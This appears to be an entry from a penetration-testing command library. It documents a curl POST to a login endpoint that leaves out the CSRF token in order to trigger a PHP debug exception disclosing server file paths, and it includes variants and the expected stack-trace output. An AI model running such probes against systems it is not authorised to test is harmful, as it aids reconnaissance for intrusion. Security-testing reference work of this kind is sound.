---
data: >-
  curl -X POST 'https://target.com/login' -d
  'username=zrgzrgzerg&passphrase=sergsergsergrg&two_factor=' -H 'Content-Type:
  application/x-www-form-urlencoded' -v
tags:
  - web-testing
  - csrf
  - information-disclosure
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: a07b9c26-eae2-4a4d-be80-01ac797228d5
created_at: '2025-12-14T17:27:03.602Z'
updated_at: '2025-12-14T17:27:03.602Z'
verified: false
validated: true
submitted: true
---
# curl-post-without-csrf

## Command

```bash
curl -X POST 'https://target.com/login' \
  -d 'username=zrgzrgzerg&passphrase=sergsergsergrg&two_factor=' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -v
```

## Description

This command uses curl to send a tampered POST request to a web application's login endpoint without the CSRF token, triggering an exception in debug mode to disclose server file paths. It is useful for testing CSRF validation and error handling in PHP-based web apps like CSPR.NG.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `'https://target.com/login'` | The target URL for the login endpoint (replace with actual URL) | Yes |
| `-d '...'` | The request body with form data, omitting _CSRF_TOKEN (customize username/passphrase as needed) | Yes |
| `-H 'Content-Type: ...'` | Sets the content type for form-urlencoded data | Yes |
| `-v` | Enables verbose mode to show full request/response details | No |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target.com/login' -d 'username=test&passphrase=test' -H 'Content-Type: application/x-www-form-urlencoded' -v
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/login' \
  -d 'username=zrgzrgzerg&passphrase=sergsergsergrg&two_factor=&other_param=value' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: session=abc123' \
  -v
```

Add cookies for authenticated sessions if required.

## Expected Output

A verbose HTTP response showing a 500 Internal Server Error with PHP exception details, including stack trace like "Fatal error: Undefined variable: ex in /var/www/csprng/src/public/index.php on line 160". The path disclosure confirms success.

## Related

- [[Related Procedure|procedures/Trigger-Path-Disclosure-by-Omitting-CSRF-Token]]
